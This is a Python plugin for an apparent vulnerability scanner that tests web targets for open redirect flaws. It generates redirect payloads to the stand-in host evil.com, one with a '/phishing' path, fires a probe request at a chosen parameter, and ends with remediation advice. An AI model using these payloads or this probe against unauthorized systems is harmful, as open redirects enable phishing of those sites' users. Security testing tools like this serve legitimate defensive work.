"""
Open Redirect Exploit Plugin

This plugin provides exploit capabilities for Open Redirect vulnerabilities.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class OpenRedirectPlugin(ExploitPlugin):
    """Open Redirect exploit plugin."""
    
    @property
    def vulnerability_type(self) -> str:
        return 'open_redirect'
    
    @property
    def name(self) -> str:
        return 'Open Redirect Exploit'
    
    @property
    def description(self) -> str:
        return 'Open Redirect exploit plugin for testing redirect vulnerabilities.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate Open Redirect payloads."""
        context = context or {}
        target_domain = context.get('target_domain', 'evil.com')
        
        return [
            f'http://{target_domain}',
            f'https://{target_domain}',
            f'//{target_domain}',
            f'http://{target_domain}/phishing',
        ]
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute Open Redirect attack."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests library not available', 'vulnerability_type': 'open_redirect'}
        
        parameter = vulnerability_data.get('parameter')
        if not parameter:
            return {'success': False, 'error': 'No parameter specified', 'vulnerability_type': 'open_redirect'}
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        # Test redirect
        try:
            params = {parameter: 'http://evil.com'}
            response = requests.get(target_url, params=params, timeout=timeout, verify=verify_ssl, allow_redirects=False)
            
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if 'evil.com' in location:
                    return {
                        'success': True,
                        'evidence': f'Successful redirect to: {location}',
                        'vulnerability_type': 'open_redirect',
                        'message': 'Open redirect confirmed',
                    }
        except Exception as e:
            logger.debug(f"Error: {e}")
        
        return {'success': False, 'error': 'Could not exploit', 'vulnerability_type': 'open_redirect'}
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent Open Redirect attacks:\n'
            '1. Validate redirect URLs against whitelist\n'
            '2. Use relative URLs for redirects\n'
            '3. Implement redirect token validation\n'
            '4. Avoid user-controlled redirects\n'
            '5. Use indirect references\n'
            '6. Log and monitor redirects'
        )
